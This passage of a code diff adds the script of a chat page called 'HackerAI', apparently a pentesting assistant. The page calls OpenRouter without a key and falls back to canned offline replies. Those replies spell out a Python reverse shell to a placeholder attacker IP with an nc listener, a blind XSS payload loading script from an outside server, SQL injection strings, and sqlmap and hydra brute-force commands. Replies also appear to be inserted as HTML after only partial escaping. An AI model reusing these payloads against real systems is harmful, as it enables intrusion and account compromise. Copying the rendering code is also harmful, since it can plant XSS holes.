+                .replace(/>/g, '&gt;');
+
+            // Code blocks ```...```
+            html = html.replace(/```(\w*)\n([\s\S]*?)```/g, (_, lang, code) => {
+                return `<pre><code>${code.trim()}</code></pre>`;
+            });
+
+            // Inline code `...`
+            html = html.replace(/`([^`]+)`/g, '<code>$1</code>');
+
+            // Bold **...**
+            html = html.replace(/\*\*([^*]+)\*\*/g, '<strong>$1</strong>');
+
+            // Newlines -> paragraphs
+            const paragraphs = html.split(/\n\s*\n/);
+            html = paragraphs.map(p => {
+                const trimmed = p.trim();
+                if (!trimmed) return '';
+                if (trimmed.startsWith('<pre>')) return trimmed;
+                return `<p>${trimmed.replace(/\n/g, '<br>')}</p>`;
+            }).join('');
+
+            return html;
+        }
+
+        function showTyping() {
+            const div = document.createElement('div');
+            div.className = 'message bot';
+            div.id = 'typing-indicator';
+            div.innerHTML = `
+                <div class="avatar">H</div>
+                <div class="bubble">
+                    <div class="typing-indicator">
+                        <span></span><span></span><span></span>
+                    </div>
+                </div>
+            `;
+            messagesEl.appendChild(div);
+            messagesEl.scrollTop = messagesEl.scrollHeight;
+        }
+
+        function removeTyping() {
+            const el = document.getElementById('typing-indicator');
+            if (el) el.remove();
+        }
+
+        // --- API call (no token, no auth) ---
+        async function sendMessage(userText) {
+            // Add user message to UI + history
+            addMessage('user', userText);
+            history.push({ role: 'user', content: userText });
+
+            // Disable input
+            inputEl.disabled = true;
+            sendBtn.disabled = true;
+            showTyping();
+
+            try {
+                // Use a free, no-token API — OpenRouter with freely available models
+                // or fallback to a serverless endpoint.
+                // Here we use OpenRouter's free DeepSeek/Gemini via no-auth if possible,
+                // but we'll use a simple approach: we call a public demo API.
+                //
+                // Option 1: Use the "HuggingFace" free inference API (no token needed for some models)
+                // Option 2: Use OpenRouter with no key (rate-limited but works)
+                //
+                // We'll use OpenRouter's publicly accessible endpoint with model "deepseek/deepseek-chat"
+                // which sometimes works without a key. If it fails, we'll fallback to a local echo.
+
+                const response = await fetch('https://openrouter.ai/api/v1/chat/completions', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'HTTP-Referer': window.location.origin,
+                        'X-Title': 'HackerAI Local'
+                    },
+                    body: JSON.stringify({
+                        model: 'deepseek/deepseek-chat',
+                        messages: history,
+                        max_tokens: 1024,
+                        temperature: 0.7
+                    })
+                });
+
+                if (!response.ok) {
+                    throw new Error(`API error: ${response.status}`);
+                }
+
+                const data = await response.json();
+                const reply = data.choices?.[0]?.message?.content || 'No response.';
+
+                // Add bot reply to history and UI
+                history.push({ role: 'assistant', content: reply });
+                removeTyping();
+                addMessage('bot', reply);
+
+            } catch (err) {
+                removeTyping();
+                // Fallback: offline mode with smart replies
+                const fallback = getFallbackReply(userText);
+                history.push({ role: 'assistant', content: fallback });
+                addMessage('bot', fallback + '\n\n*(Offline mode — API unreachable)*');
+            }
+
+            // Re-enable input
+            inputEl.disabled = false;
+            sendBtn.disabled = false;
+            inputEl.focus();
+        }
+
+        // --- Offline fallback replies for common pentest questions ---
+        function getFallbackReply(text) {
+            const lower = text.toLowerCase();
+
+            if (lower.includes('scan') || lower.includes('port') || lower.includes('nmap')) {
+                return 'For port scanning, use `nmap -sV -sC -O <target>`. This runs version detection, default scripts, and OS fingerprinting. Example:\n\n```\nnmap -sV -sC -O 10.10.10.1\n```\n\nFor faster scans: `nmap -T4 -F <target>`.';
+            }
+
+            if (lower.includes('sql') || lower.includes('sqlmap')) {
+                return 'SQL injection test: try `\' OR \'1\'=\'1` in input fields.\n\nUse sqlmap for automation:\n```\nsqlmap -u "http://target.com/page?id=1" --batch --dbs\n```\n\nCommon payload: `\' UNION SELECT NULL,table_name,NULL FROM information_schema.tables--`.';
+            }
+
+            if (lower.includes('xss') || lower.includes('cross')) {
+                return 'Test for XSS with:\n```html\n<script>alert(1)</script>\n<img src=x onerror=alert(1)>\n<svg onload=alert(1)>\n```\n\nCheck if input reflects unescaped. For blind XSS, use a payload that calls back to your server:\n```\n<script src="http://your-server/xss.js"></script>\n```';
+            }
+
+            if (lower.includes('reverse') || lower.includes('shell')) {
+                return 'Python reverse shell:\n```python\nimport socket,subprocess,os\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.connect(("YOUR_IP",4444))\nos.dup2(s.fileno(),0)\nos.dup2(s.fileno(),1)\nos.dup2(s.fileno(),2)\nimport pty\npty.spawn("/bin/bash")\n```\n\nListener: `nc -lvnp 4444`';
+            }
+
+            if (lower.includes('help') || lower.includes('hello') || lower.includes('hi')) {
+                return 'I\'m HackerAI, your pentesting assistant. Ask me about:\n- Scanning & reconnaissance\n- Exploitation (SQLi, XSS, LFI, etc.)\n- Reverse shells & payloads\n- Vulnerability analysis\n- Security misconfigurations';
+            }
+
+            if (lower.includes('brute') || lower.includes('hydra') || lower.includes('password')) {
+                return 'Hydra brute-force example:\n```\nhydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.1\n```\n\nFor web forms:\n```\nhydra -L users.txt -P pass.txt target.com http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"\n```';
+            }
+
+            return 'I understand you\'re asking about: "' + text + '"\n\nTo give you the most accurate answer, please provide more details about what you\'re testing. For example:\n- Target type (web app, network, API)\n- What you\'ve already tried\n- Specific vulnerability class you\'re investigating';
+        }
+
+        // --- Event handlers ---
+        function handleSend() {
+            const text = inputEl.value.trim();
+            if (!text) return;
+
+            inputEl.value = '';
+            inputEl.style.height = 'auto';
+            sendMessage(text);
+        }
+
+        inputEl.addEventListener('input', () => {
+            autoResize();
+            sendBtn.disabled = inputEl.value.trim().length === 0;
+        });
+
+        inputEl.addEventListener('keydown', (e) => {
+            if (e.key === 'Enter' && !e.shiftKey) {
+                e.preventDefault();
+                handleSend();
+            }
+        });
+
+        sendBtn.addEventListener('click', handleSend);
+
+        // --- Init ---
+        showWelcome();
+        inputEl.focus();
+    </script>
 
 </body>
 </html>
